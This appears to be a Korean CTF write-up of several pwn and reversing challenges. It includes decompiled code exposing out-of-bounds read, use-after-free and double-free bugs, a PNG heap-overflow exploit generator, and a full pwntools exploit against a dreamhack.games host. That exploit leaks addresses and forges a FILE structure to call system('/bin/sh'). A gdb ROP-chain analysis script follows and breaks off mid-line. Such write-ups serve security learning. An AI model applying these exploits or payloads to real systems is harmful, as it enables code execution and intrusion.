DFB # glibc 2.27 has tcache-\u0026gt;key validation. no dfb # masternode -\u0026gt; node3 -\u0026gt; node2 -\u0026gt; node1 # masternode -\u0026gt; fd -\u0026gt; fd == current node # masternode -\u0026gt; fd == prev node # masternode -\u0026gt; fd -\u0026gt; fd -\u0026gt; fd == next node # unlink , pop # matsernode -\u0026gt; fd -\u0026gt; fd -\u0026gt; fd -\u0026gt; bk = masternode -\u0026gt; fd # masternode -\u0026gt; fd -\u0026gt; fd = masternode -\u0026gt; fd -\u0026gt; fd -\u0026gt; fd # free payload # free node # trigger1 # payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) # payload += gen_chunk(0x20, b\u0026#39;IHDR\u0026#39;, b\u0026#39;A\u0026#39;*0x20) # chunk = b\u0026#39;\u0026#39; # chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3 # chunk += p32(0) # chunk += p32(0x378) # chunk += b\u0026#39;iTXt\u0026#39; # chunk += b\u0026#39;A\u0026#39;*(0x28 - len(chunk)) # chunk += p64(0x7fffffffd7fc-4) # payload += gen_chunk(0x30, b\u0026#39;NOD2\u0026#39;, chunk) # payload += gen_chunk(0x30, b\u0026#39;NOD1\u0026#39;, bytes([0xCA, 0xFE, 0xCA, 0xFE])*2*2*3) # payload += gen_chunk(0x30, b\u0026#39;IEND\u0026#39;, p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b\u0026#39;B\u0026#39;*0x10) # trigger2 heapoverflow payload = bytes([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]) pay = b\u0026#39;\u0026#39; pay += b\u0026#39;A\u0026#39;*(0xf8-len(pay)) pay += p64(0xffffffffffffffff) pay += b\u0026#39;B\u0026#39;*(0x100f8-len(pay)) payload += gen_chunk(0x100f8,b\u0026#39;IHDR\u0026#39;,pay) chunk = b\u0026#39;\u0026#39; chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE])*3 chunk += p32(0) chunk += p32(0xffffec58+0x10-0x20) # size chunk += b\u0026#39;iTXt\u0026#39; chunk += p32(0x400CC7) chunk += bytes([0xCA, 0xFE, 0xCA, 0xFE]) # hdr for payload ptr chunk += b\u0026#39;C\u0026#39;*(0x28 - len(chunk)) chunk += p64(0x6045bc) # payload ptr payload += gen_chunk(0x30, b\u0026#39;NOD2\u0026#39;, chunk) payload += gen_chunk(0x30, b\u0026#39;NOD1\u0026#39;, b\u0026#39;A\u0026#39;*0x30) payload += gen_chunk(0x30, b\u0026#39;IEND\u0026#39;, p32(0)*7+bytes([0xca, 0xfe, 0xca, 0xfe])+b\u0026#39;B\u0026#39;*0x10) # payload -\u0026gt; asdf ptr with open(\u0026#39;./exploit.png\u0026#39;,\u0026#39;wb\u0026#39;) as f: f.write(payload) # 0x400CC7 -\u0026gt; read flag # 0x13e4 victim = av-\u0026gt;top; size = chunksize (victim); if ((unsigned long) (size) \u0026gt;= (unsigned long) (nb + MINSIZE)) { remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); av-\u0026gt;top = remainder; set_head (victim, nb | PREV_INUSE | (av != \u0026amp;main_arena ? NON_MAIN_ARENA : 0)); set_head (remainder, remainder_size | PREV_INUSE); check_malloced_chunk (av, victim, nb); void *p = chunk2mem (victim); alloc_perturb (p, bytes); return p; } /* When we are using atomic ops to free fast chunks we can get here for all block sizes. */ else if (atomic_load_relaxed (\u0026amp;av-\u0026gt;have_fastchunks)) { malloc_consolidate (av); /* restore original bin index */ if (in_smallbin_range (nb)) idx = smallbin_index (nb); else idx = largebin_index (nb); } glibc 2.27 소스를 확인해보면 chunk_at_offset에서 victim + nb를 하게 된다. heap overflow로 size를 덮어서 검증을 우회하고, 0xffff까지의 입력을 넣을 수 있으니 sign extension이 발생하며 이를 이용해서 top chunk로 부터의 상대 주소로 접근할 수 있게된다. 0xffff의 입력은 page 단위로 올라가기 충분하며, got에 접근할 수 있다. 그걸 이용해 exit got를 덮는다.\nAespropective Analysis print_menu(); std::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)sel); switch ( sel[0] ) { case 1: create_AES_obj(); break; case 2: remove_AES_obj(); break; case 3: set_plain_cipher_txt(); break; case 4: enc(); break; case 5: dec(\u0026amp;std::cin, sel); // useless, not implemented yet break; default: continue; } } } // UAF leads to memory leak std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Enter key size: \u0026#34;); std::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)\u0026amp;keysz); switch ( keysz ) { case 128u: v1 = (AES_obj *)operator new(0x28uLL); init_AES_128(v1); aes_obj_ptr = v1; break; case 192u: v2 = (__int64 *)operator new(0x28uLL); init_AES_192(v2); aes_obj_ptr = (AES_obj *)v2; break; case 256u: v3 = (__int64 *)operator new(0x28uLL); init_AES_256(v3); aes_obj_ptr = (AES_obj *)v3; break; default: v4 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;No way\u0026#34;); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u0026lt;\u0026lt;)(v4, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); exit(0); } keysz \u0026gt;\u0026gt;= 3; key_content = (void *)operator new[](keysz); set_cipher_key(key_content, keysz); key_schedule(aes_obj_ptr, (char *)key_content);// AES256 OoB. Key corrupted. v5 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;( (int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;This is sha256 for the encryption key: \u0026#34;); ((void (__fastcall *)(__int64, void *))std::ostream::operator\u0026lt;\u0026lt;)(v5, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); sha256((__int64)hashed_output, aes_obj_ptr); v6 = std::operator\u0026lt;\u0026lt;\u0026lt;char\u0026gt;(\u0026amp;std::cout, hashed_output); 키 사이즈에 따른 aes 객체들이 구현되어있다. 리버싱한 결과, AES ECB임이 확인되었다. 그리고 따로 처음에 키 스케쥴링 로직도 확인되었다.\nv6 = __readfsqword(0x28u); obj-\u0026gt;cipher_and_round_keys = (char *)operator new[](0xB0uLL); *(_DWORD *)key_back = 0; *(_DWORD *)rcon = 0; for ( i = 0; i \u0026lt;= 15; ++i ) obj-\u0026gt;cipher_and_round_keys[i] = obj-\u0026gt;key_content[i]; for ( j = 16; j \u0026lt;= 0xAF; j += 4 ) { key_back[0] = obj-\u0026gt;cipher_and_round_keys[j - 4]; key_back[1] = obj-\u0026gt;cipher_and_round_keys[j - 3]; key_back[2] = obj-\u0026gt;cipher_and_round_keys[j - 2]; key_back[3] = obj-\u0026gt;cipher_and_round_keys[j - 1]; if ( ((j / 4) \u0026amp; 3) == 0 ) // multiples of 4, means following logics applied at roundkey\u0026#39;s first col { Rot_word(obj, key_back); // shift upwards Sub_bytes(obj, (int8_t *)key_back); set_rcon(obj, rcon, j / 16); add_rcon(obj, (char *)key_back, rcon, (char *)key_back); } obj-\u0026gt;cipher_and_round_keys[j] = key_back[0] ^ obj-\u0026gt;cipher_and_round_keys[j - 16]; obj-\u0026gt;cipher_and_round_keys[j + 1] = key_back[1] ^ obj-\u0026gt;cipher_and_round_keys[j - 15]; obj-\u0026gt;cipher_and_round_keys[j + 2] = key_back[2] ^ obj-\u0026gt;cipher_and_round_keys[j - 14]; obj-\u0026gt;cipher_and_round_keys[j + 3] = key_back[3] ^ obj-\u0026gt;cipher_and_round_keys[j - 13]; } return __readfsqword(0x28u) ^ v6; } // do keyscheduling 이런식으로 처음에 round key들을 미리 계산한다.\nExploitation unsigned __int64 v6; // [rsp+28h] [rbp-8h] v6 = __readfsqword(0x28u); a1-\u0026gt;cipher_and_round_keys = (char *)operator new[](0xD0uLL); v4 = 0; v5 = 0; for ( i = 0; i \u0026lt;= 23; ++i ) a1-\u0026gt;cipher_and_round_keys[i] = a1-\u0026gt;key_content[i]; for ( j = 24; j \u0026lt;= 0xCF; j += 4 ) { LOWORD(v4) = *(_WORD *)\u0026amp;a1-\u0026gt;cipher_and_round_keys[j - 4]; BYTE2(v4) = a1-\u0026gt;cipher_and_round_keys[j - 2]; HIBYTE(v4) = a1-\u0026gt;cipher_and_round_keys[j - 1]; if ( !(j / 4 % 6) ) { Rot_word(a1, (unsigned __int8 *)\u0026amp;v4); Sub_bytes(a1, (int8_t *)\u0026amp;v4); set_rcon(a1, (char *)\u0026amp;v5, j / 24); add_rcon(a1, (char *)\u0026amp;v4, (char *)\u0026amp;v5, (char *)\u0026amp;v4); } a1-\u0026gt;cipher_and_round_keys[j] = v4 ^ a1-\u0026gt;cipher_and_round_keys[j - 24]; a1-\u0026gt;cipher_and_round_keys[j + 1] = BYTE1(v4) ^ a1-\u0026gt;cipher_and_round_keys[j - 23]; a1-\u0026gt;cipher_and_round_keys[j + 2] = BYTE2(v4) ^ a1-\u0026gt;cipher_and_round_keys[j - 22]; a1-\u0026gt;cipher_and_round_keys[j + 3] = HIBYTE(v4) ^ a1-\u0026gt;cipher_and_round_keys[j - 21]; } return __readfsqword(0x28u) ^ v6; } AES192의 키 스케쥴링 로직에서 OoB Read가 발생하며, secret키의 일부에 반영된다. 또한 remove 과정에 있어서 로직 버그가 발생하여 정상적이지 않은 노드가 free될 수 있었다.\nv9 = __readfsqword(0x28u); std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Which index do you want to delete ?\u0026#34;); std::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)\u0026amp;idx); v0 = idx; if ( v0 \u0026gt;= get_length(vector_AES_obj) ) { v1 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;No way\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v1, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); exit(0); } idx_1 = idx; iterator = get_vector_iterator(vector_AES_obj); v7 = get_ele_by_idx(\u0026amp;iterator, idx_1); copy_element_ptr(\u0026amp;element_ptr, (__int64)\u0026amp;v7); remove_element((__int64)vector_AES_obj, element_ptr); v3 = *(void **)get_vect_at_idx(vector_AES_obj, idx);// OoB delete if ( v3 ) operator delete(v3, 0x28uLL); return __readfsqword(0x28u) ^ v9; } __int64 __fastcall sub_3524(__int64 vecotr, __int64 ele_vect_ptr) { __int64 ned; // rbx __int64 ele_by_idx; // rax __int64 ele_vec; // [rsp+0h] [rbp-40h] BYREF __int64 v6; // [rsp+8h] [rbp-38h] __int64 next_one; // [rsp+18h] [rbp-28h] BYREF __int64 end[4]; // [rsp+20h] [rbp-20h] BYREF v6 = vecotr; ele_vec = ele_vect_ptr; end[1] = __readfsqword(0x28u); end[0] = get_end(vecotr); // vector end next_one = get_ele_by_idx(\u0026amp;ele_vec, 1LL); if ( is_not_end((__int64)\u0026amp;next_one, (__int64)end) ) { ned = get_end(v6); ele_by_idx = get_ele_by_idx(\u0026amp;ele_vec, 1LL); delete_element(ele_by_idx, ned, ele_vec); } *(_QWORD *)(v6 + 8) -= 8LL; // decrement sub_3872(v6, *(_QWORD *)(v6 + 8)); return ele_vec; } 마지막 노드를 삭제시 정상적으로 free가 된다. 하지만 중간 노드에 대해 삭제를 진행하면, dangling pointer가 남게 되고, double free가 발생할 수 있다. fastbin에서 free 검증이 널널하다는 것을 생각하면, dfb도 트리거가 가능해진다.\nstd::istream::operator\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cin, (int64_t)\u0026amp;len); if ( len \u0026gt; 0x400 || (len \u0026amp; 0xF) != 0 ) { v0 = std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Invalid {plain,cipher}text length\u0026#34;); std::ostream::operator\u0026lt;\u0026lt;(v0, \u0026amp;std::endl\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;\u0026gt;); exit(0); } if ( nbytes != len ) buf = (void *)operator new[](len); nbytes = len; std::operator\u0026lt;\u0026lt;\u0026lt;std::char_traits\u0026lt;char\u0026gt;\u0026gt;((int64_t)\u0026amp;std::cout, (int64_t)\u0026#34;Enter {plain,cipher}text: \u0026#34;); read(0, buf, nbytes); return __readfsqword(0x28u) ^ v3; 여기서 freed chunk 대해서 reclaim이 가능하다. 또한 잠재적인 UAF가 발생할 수 있다.\nExploit script \u0026#39;\u0026#39;\u0026#39; 1) AES256 Vulnerable OoB READ while initializing Key. 2) deleting aes object triggers UAF. 3) buf reclaim leads to memleak. \u0026#39;\u0026#39;\u0026#39; from pwn import * \\#p = process(\u0026#39;./out.bin\u0026#39;) p = remote(\u0026#39;host3.dreamhack.games\u0026#39;, 18810) context.binary = e = ELF(\u0026#39;./out.bin\u0026#39;) libc = ELF(\u0026#39;./bc.so.6\u0026#39;) sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) def create_AES_object(keysz): sla(b\u0026#39;\u0026gt;\u0026gt;\u0026#39;,str(1)) sla(b\u0026#39;size: \u0026#39;,str(keysz)) def remove_AES_object(idx): sla(b\u0026#39;\u0026gt;\u0026gt;\u0026#39;,str(2)) sla(b\u0026#39;delete\u0026#39;,str(idx)) def set_plain_cipher_txt(sz, payload): assert sz\u0026amp;0xf==0 sla(b\u0026#39;\u0026gt;\u0026gt;\u0026#39;,str(3)) sla(b\u0026#39;length:\u0026#39;,str(sz)) sa(b\u0026#39;text: \u0026#39;,payload) def encrypt(idx): sla(b\u0026#39;\u0026gt;\u0026gt; \u0026#39;,str(4)) sla(b\u0026#39;?\u0026#39;,str(idx)) for i in range(20): # 11 create_AES_object(128) for i in range(19,12,-1): # 10 remove_AES_object(i) remove_AES_object(6) # free # vect[3] = vect[4], vect[5] remove_AES_object(4) # vect[1] = vect[2], vect[4] remove_AES_object(4) # for i in range(6): # set_plain_cipher_txt(0x20,b\u0026#39;\\xa0\u0026#39;) # set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) for i in range(3): create_AES_object(128) set_plain_cipher_txt(0x20,b\u0026#39;\\xa0\u0026#39;) create_AES_object(128) set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) set_plain_cipher_txt(0x20,b\u0026#39;\\xe8\u0026#39;) encrypt(4) rv = (p.recv(0x20)) bin_base = u64(rv[:8]) - 0x00DBE8 heap = u64(rv[16:16+8]) success(hex(heap)) success(hex(bin_base)) remove_AES_object(3) set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) set_plain_cipher_txt(0x20,p64(bin_base + 0x00DBE8)) set_plain_cipher_txt(0x10,b\u0026#39;\\xa0\u0026#39;) set_plain_cipher_txt(0x20,p64(0)) encrypt(3) rv = (p.recv(0x20)) libc_base = u64(rv[16:24]) - libc.sym._IO_2_1_stdout_ success(hex(libc_base)) vtable = 0x1e9260 + libc_base payload_start = heap -0x29b0 payload = b\u0026#39;\u0026#39; payload += p64(0x00000000fbad2084) payload += p64(0) * 12 payload += p64(libc_base + libc.sym._IO_2_1_stdin_) payload += p64(1) payload += p64(0xffffffffffffffff) payload += p64(0) payload += p64(heap) # lock payload += p64(0xffffffffffffffff) payload += p64(0) payload += p64(heap+0x20) payload += p64(0)*6 payload += p64(vtable) payload += p64(payload_start + len(payload)+8) payload += p64(0) * 7 payload += p64(libc_base + libc.sym[\u0026#34;system\u0026#34;]) payload += p64(0) payload += p64(libc_base+ next(libc.search(b\u0026#39;/bin/sh\u0026#39;))) payload += p64(1) assert len(payload) \u0026lt; 0x200 remove_AES_object(2) stdcpp_target= libc_base + 0x1ded60 + 0x20d000 + 0x40 set_plain_cipher_txt(0x200,payload) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) remove_AES_object(1) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) remove_AES_object(0) set_plain_cipher_txt(0x20,p64(stdcpp_target)+p64(0)) # set target set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0)) set_plain_cipher_txt(0x20,p64(0xdeadbeef)) set_plain_cipher_txt(0x10,p64(bin_base+0x0E030)+p64(0)) pause() set_plain_cipher_txt(0x20,p64(payload_start)) success(payload_start) # remove_AES_object(1) # set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) # pause() # set_plain_cipher_txt(0x20,p64(0)*3+p64(payload_start)) # remove_AES_object(3) # set_plain_cipher_txt(0x20,p64(bin_base+0x0E030)+p64(0)) # for i in range(2): # set_plain_cipher_txt(0x20,b\u0026#39;\\x30\u0026#39;) # set_plain_cipher_txt(0x10,b\u0026#39;A\u0026#39;) # set_plain_cipher_txt(0x20,b\u0026#39;\\x30\u0026#39;) # create_AES_object(128) # set_plain_cipher_txt(0x20,p64(bin_base + 0x0DBE8)+p64(0)) # can be changed to heap # set_plain_cipher_txt(0x10,b\u0026#39;A\u0026#39;) # set_plain_cipher_txt(0x20,b\u0026#39;A\u0026#39;) # encrypt(1) # rv = (p.recv(0x20)) p.interactive() double free를 이용해서 AES_object + 0x0에 위치한 vtable을 dummy vtable로 수정하고 encrypt를 호출해 plain text를 노출시켜서 메모리 릭을 할 수 있다. 이후 stdout을 릭하고 이를 덮어서 FSOP를 했다.\nLor - Diablo (pwn) \u0026amp; LoR - mechagolem (rev) Analysis 리버싱 겸 포너블이였다. 먼저 디스어셈블러를 짜고 편의기능을 추가해서 분석을 시도했다.\nimport gdb import struct inf = gdb.selected_inferior() start = 0x34785000 end = 0x3478a2d0 tmp = inf.read_memory(start,end-start) chains = [] for i in range(((end-start)//8)): chains.append(struct.unpack(\u0026#39;\u0026lt;Q\u0026#39;, tmp[i*8:i*8+8])[0]) print(\u0026#39;chains ready\u0026#39;) # var_564edd86b078 = length gads = [] i = 0 while i \u0026lt; len(chains): ele = chains[i] if \u0026#39;r-x\u0026#39; in gdb.execute(f\u0026#39;xinfo {ele}\u0026#39;,to_string=True): out = gdb.execute(f\u0026#39;x/20xi {ele}\u0026#39;,to_string=True) if ele not in gads: gads.append(ele) lines = out.split(\u0026#39;\\n\u0026#39;) for line in lines: pass # print(line.split(\u0026#39;\\t\u0026#39;)[-1]) if \u0026#39;ret\u0026#39; in line: break else: pass # print(hex(ele)) i += 1 gads_ = [] c = 0 for i in gads: out = gdb.execute(f\u0026#39;x/20xi {i}\u0026#39;,to_string = True) lines = out.split(\u0026#39;\\n\u0026#39;) gads_.append([]) for line in lines: gads_[c].append(line.split(\u0026#39;\\t\u0026#39;)[-1]) if \u0026#39;ret\u0026#39; in line: break c += 1 # c = 0 # for i in gads_: # print(f\u0026#39;{hex(start+i*8)}: gads_[{c}] : \u0026#39;+\u0026#39;;\u0026#39;.join(i)) # c += 1 rax = 0 rbx = 0 rcx = 0 rdx = 0 rdi = 0 rsi = 0 r8 = 0 rbp = 0 rsp = 0 eflags = 0 const_1 = 0 bin_base = 0x000055765999c000 variables = { 0x12078 + bin_base : f\u0026#39;usr_input_len_{hex(bin_base+0x12078)[2:]}\u0026#39;, 0x12068 + bin_base : f\u0026#39;iterator_{hex(bin_base + 0x12068)[2:]}\u0026#39;, 0x12060 + bin_base : f\u0026#39;tmp_{hex(bin_base+0x12060)[2:]}\u0026#39; } ambig = 0b1 confi = 0b10 ambig_ptr = 0b100 reg_state ={ \u0026#39;rax\u0026#39; : ambig, \u0026#39;rbx\u0026#39; : ambig, \u0026#39;rcx\u0026#39; : ambig, \u0026#39;rdx\u0026#39; : ambig, \u0026#39;rdi\u0026#39; : ambig, \u0026#39;rsi\u0026#39; : ambig, \u0026#39;r8\u0026#39; : ambig, \u0026#39;rbp\u0026#39; : ambig, \u0026#39;rsp\u0026#39; : ambig, \u0026#39;eflags\u0026#39; : ambig } def process(addr): global i, chains, gads, rax, rbx, rcx, rdx, rdi, rsi, r8 ,rbp, rsp, eflags global variables, reg_state, ambig, confi if addr == gads[0]: if not const_1: if i == 0: print(\u0026#39;-------- main() ---------\u0026#39;) elif start+i*8 == 0x34785440: print(\u0026#39;-------- exit_internal() ---------\u0026#39;) print(f\u0026#39;{hex(start+i*8)}: rdx = {chains[i+1]} ; r12 = {chains[i+2]}\u0026#39;) rdx = chains[i+1] r12 = chains[i+2] reg_state[\u0026#39;rdx\u0026#39;] = confi | ambig_ptr reg_state[\u0026#39;r12\u0026#39;] = confi | ambig_ptr i += 2 elif addr == gads[1]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rsi = {chains[i+1]}\u0026#39;) rsi = chains[i+1] reg_state[\u0026#39;rsi\u0026#39;] = confi | ambig_ptr i += 1 elif addr == gads[2]: if not const_1: print(f\u0026#39;{hex(start+i*8)}: rdi = {chains[i+1]}\u0026#39;) rdi = chains[i+1] reg_state[\u0026#39;rdi\u0026#39;] = confi | ambig_ptr i += 1 elif addr == gads[3]: if not const_1: if start+i*8 == 0x34785390: print(\u0026#39;-------- encode() ---------\u0026#39;) elif start+i*8 == 0x347853c8: print(\u0026#39;-------- print() ---------\u0026#39;) elif start+i*8 == 0x34785400: print(\u0026#39;-------- exit() ---------\u0026#39;) elif start+i*8 == 0x347855d8: print(\u0026#39;-------- encode_internal() ---------\u0026#39;) print(f\u0026#39;{hex(start+i*8)}: rax = {chains[i+1]}\u0026#39;) rax = chains[i+1] reg_state[\u0026#39;rax\u0026#39;] = confi | ambig_ptr i += 1 elif addr == gads[4]: if rax == 1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi and reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: out = gdb.execute(f\u0026#39;x/s {rsi}\u0026#39;,to_string = True) out = (out[out.index(\u0026#39;\u0026#34;\u0026#39;):-1]) print(f\u0026#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx}) // {out}\u0026#39;) rax = rdx reg_state[\u0026#39;rax\u0026#39;] |= confi else: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, {rdx})\u0026#39;) rax = rdx reg_state[\u0026#39;rax\u0026#39;] = confi else: print(f\u0026#39;{hex(start+i*8)}: sys_write({rdi}, {hex(rsi)}, rdx)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig else: print(f\u0026#39;{hex(start+i*8)}: sys_write(rdi, rsi, rdx)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig elif rax == 0: if rsi not in variables.keys() and reg_state[\u0026#39;rsi\u0026#39;] \u0026amp;confi: varname = hex(rsi).replace(\u0026#39;0x\u0026#39;,\u0026#39;\u0026#39;) variables[rsi] = f\u0026#39;buf_{varname}\u0026#39; if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, {rdx})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_read({rdi}, rsi , {rdx})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, {rdx})\u0026#39;) rax = rdx reg_state[\u0026#39;rax\u0026#39;] = confi else: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_read({rdi}, {variables[rsi]}, rdx)\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_read(rdi, {variables[rsi]}, rdx)\u0026#39;) reg_state[\u0026#39;rsi\u0026#39;] = confi reg_state[\u0026#39;rax\u0026#39;] = ambig elif rax == 60: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: sys_exit({rdi})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: sys_exit(rdi)\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: syscall_{rax} ({rdi}, {rsi}, {rdx})\u0026#39;) elif addr == gads[5]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: if rax in variables.keys(): print(f\u0026#39;{hex(start+i*8)}: rax = (QWORD)({variables[rax]})\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax = *(QWORD *)(rax) // *(QWORD *){hex(rax)}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax = *(QWORD *)(rax)\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig | ambig_ptr rax = 0xdeadbeef elif addr == gads[6]: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: reg_state[\u0026#39;rax\u0026#39;] = confi else: reg_state[\u0026#39;rax\u0026#39;] = ambig else: reg_state[\u0026#39;rax\u0026#39;] = ambig if not const_1: if reg_state[\u0026#39;rsi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: eax \u0026amp;= esi // eax = {(rax)} \u0026amp; {(rsi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = confi else: print(f\u0026#39;{hex(start+i*8)}: eax \u0026amp;= esi // eax \u0026amp;= {(rsi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig else: print(f\u0026#39;{hex(start+i*8)}: eax \u0026amp;= esi\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig rax \u0026amp;= rsi\u0026amp;0xffffffff elif addr == gads[7]: if not const_1: if reg_state[\u0026#39;rdi\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax -= rdi // rax = {(rax)} - {(rdi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = confi reg_state[\u0026#39;eflags\u0026#39;] = confi eflags = (rax - rdi)\u0026amp;0xfffffffffffffffff == 0 else: print(f\u0026#39;{hex(start+i*8)}: rax -= rdi // rax -= {(rdi)}\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig reg_state[\u0026#39;eflags\u0026#39;] = ambig else: print(f\u0026#39;{hex(start+i*8)}: rax -= rdi\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig reg_state[\u0026#39;eflags\u0026#39;] = ambig rax -= rdi rax \u0026amp;= 0xffffffffffffffff elif addr == gads[8]: if not const_1: if reg_state[\u0026#39;eflags\u0026#39;] \u0026amp;ambig: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: if true -\u0026gt; rax = {hex(rdx)} else -\u0026gt; rax = {hex(rax)}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: if true -\u0026gt; rax = {hex(rdx)} else -\u0026gt; rax = rax\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: if true -\u0026gt; rax = rdx else -\u0026gt; rax = rax\u0026#39;) reg_state[\u0026#39;rax\u0026#39;] = ambig else: if eflags: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax = {hex(rdx)}\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rax = rdx\u0026#39;) else: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: rax = {hex(rdx)}\u0026#39;) else: pass reg_state[\u0026#39;rax\u0026#39;] = ambig | ambig_ptr rax = 0xdeadbeef elif addr == gads[9]: if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; ambig: print(f\u0026#39;{hex(start+i*8)}: rdx |= rax\u0026#39;) reg_state[\u0026#39;rdx\u0026#39;] = ambig rdx = 0xdeadbeef else: print(f\u0026#39;{hex(start+i*8)}: rdx |= rax // rdx |= {rax}\u0026#39;) reg_state[\u0026#39;rdx\u0026#39;] = confi rdx |= rax elif addr == gads[10]: if not const_1: if reg_state[\u0026#39;rdx\u0026#39;] \u0026amp; confi: if rdx == 0x34785050: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx // rsp = main+0x50 // back to menu\u0026#39;) elif rdx == 0x34785370: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx // rsp = main+0x370 // back to menu\u0026#39;) else: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx // rsp = {hex(rdx)}\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = confi rsp = rdx else: print(f\u0026#39;{hex(start+i*8)}: rsp = rdx\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = ambig rsp = 0xdeadbeef elif addr == gads[11]: # mroe interpretation required if not const_1: if reg_state[\u0026#39;rax\u0026#39;] \u0026amp; confi: print(f\u0026#39;{hex(start+i*8)}: inc idx ; stack[idx] = rsp ; rsp = {hex(rax)}\u0026#39;) reg_state[\u0026#39;rsp\u0026#39;] = confi rsp = rax else: print(f\u0026#39;{hex(start+i*8)}: inc idx ; 